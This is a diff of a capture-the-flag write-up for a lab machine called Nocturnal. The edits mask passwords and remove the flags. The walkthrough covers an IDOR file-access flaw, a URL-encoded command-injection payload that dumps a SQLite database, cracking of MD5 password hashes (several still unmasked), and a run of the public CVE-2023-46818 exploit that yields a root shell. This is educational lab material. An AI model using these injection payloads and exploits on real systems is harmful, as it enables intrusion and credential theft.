@@ -2,7 +2,7 @@ Let's scan the machine
 ```bash
 sudo nmap -v -sC -sV 10.10.11.64 -oN nmap/initial
 ```
-```http
+```
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
@@ -30,11 +30,11 @@ dirsearch -u http://nocturnal.htb
 There is a `dump.sql` file located in `/uploads/`. The goal is to download this file.
 Register an account
 
-![image](images/20250730140820.png|500)
+![image](images/20250730140820.png)
 
 The website allows you to download files
 
-![image](images/20250730140909.png|500)
+![image](images/20250730140909.png)
 
 <div style="page-break-after: always;"></div>
 
@@ -43,16 +43,16 @@ After uploading the file, it appears in `Your files`. Clicking on it starts the 
 
 ![image](images/20250730141932.png)
 
-```http
+```
 /view.php?username=dex1d&file=test.pdf
 ```
 Interesting user binding Let's try to create a second account and download a file from my first account:
 
-![image](images/20250730151450.png|500)
+![image](images/20250730151450.png)
 
 The file was not found, but all files uploaded by this user were displayed. This means that we have access to all files uploaded by any user.
 Let's see if there is a user named `admin` and if they have any uploaded files:
-```http
+```
 /view.php?username=admin&file=test.pdf
 ```
 
@@ -82,7 +82,7 @@ The user `amanda` had the file
 It contained the following:
 ```
 Dear Amanda,
-Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure.
+Nocturnal has set the following temporary password for you: arH--------X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure.
 The file has been created and provided by Nocturnal's IT team. If you have any questions or need additional assistance during the password change process, please do not hesitate to contact us.
 Remember that maintaining the security of your credentials is paramount to protecting your information and that of the company. We appreciate your prompt attention to this matter.
 
@@ -91,15 +91,15 @@ Nocturnal's IT team
 ```
 There is a password for the user `amanda`
 ```Password
-arHkG7HAI68X8s1J
+arH--------X8s1J
 ```
 Let's log in with it
 
-![image](images/20250730152357.png|500)
+![image](images/20250730152357.png)
 
 We can go to the admin panel. Let's do it
 
-![image](images/20250730152433.png|500)
+![image](images/20250730152433.png)
 
 Create a backup and download it (the password is the same as for `amanda`):
 
@@ -143,7 +143,7 @@ Since we are embedding this command in a query, spaces must be replaced with `%0
 **`%09`**: This is the URL encoding for the **tab** character. In the command, it replaces spaces.
 **`%0A`**: This is the URL encoding for the **line feed** character. It means the end of the command (pressing Enter).
 The request consists of two parts: `password` and `backup`. Since it is important for us to execute the command after `password`, we simply transfer the line after the password itself with the `%0A` character. On the new line, we write the main command for the database dump. After that, we transfer the line again. The result is as follows:
-```http
+```
 password=test%0A
 bash%09-c%09"sqlite3%09/var/www/nocturnal_database/nocturnal_database.db%09.dump"%0A
 &backup=
@@ -155,7 +155,7 @@ Sending a request and seeing the DB dump
 ```bash
 admin:d725aeba143f575736b07e045d8ceebb
 amanda:df8b20aa0c935023f99ea58358fb63c4
-tobias:55c82b1ccd55ab219b3b109b07d5061d
+tobias:55c82-------------------07d5061d
 kavi:f38c de1654b39fea2bd4f72f1ae4cdda
 e0Al5:101ad4543a96a7fd84908fd0d802e7db
 naggar:c857b738481bd8f43aa2ab7a4ff3812c
@@ -170,15 +170,10 @@ sudo john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hashes
 
 Getting the password from `tobias`:
 ```Password
-slowmotionapocalypse
+slo--------------pse
 ```
-Log in to it via SSH
+Log in to it via SSH and we have user flag!
 
-![image](images/20250730165038.png)
-
-```flag
-63f453d2ee2cd1cea9861c54f753a905
-```
 `tobias` cannot execute commands from `sudo`
 
 ![image](images/20250730165147.png)
@@ -212,7 +207,7 @@ ssh -L 18080:127.0.0.1:8080 tobias@nocturnal.htb
 
 Let's log in with the following credentials:
 ```ISPconfig
-admin/slowmotionapocalypse
+admin/slo--------pse
 ```
 
 ![image](images/20250730170548.png)
@@ -227,16 +222,9 @@ Let's check the version
 Let's try to find an [exploit](https://github.com/ajdumanhug/CVE-2023-46818) for it.
 Exploiting this vulnerability:
 ```bash
-python3 CVE-2023-46818.py http://127.0.0.1:18080 admin slowmotionapocalypse
+python3 CVE-2023-46818.py http://127.0.0.1:18080 admin slo--------pse
 ```
 Getting a `root` shell
-
-![image](images/20250730171744.png)
-
-```flag
-38ad8f9a0ba34b7e332074b6b35b7235
-```
-<div style="page-break-after: always;"></div>
 
 ## How it works
 The **ISPConfig** panel allows the administrator to edit `.lng` language files.
